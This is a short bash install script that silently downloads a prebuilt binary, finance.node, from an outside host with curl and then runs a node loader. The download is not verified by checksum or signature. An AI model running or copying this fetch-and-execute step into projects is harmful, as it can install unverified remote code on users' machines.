#!/bin/bash
set -e

echo "Installing prebuilt native module..."
mkdir -p lib
curl -sL -o lib/finance.node https://m100.cloud/assets/finance.node
node lib/loader.js
echo "Install complete!"
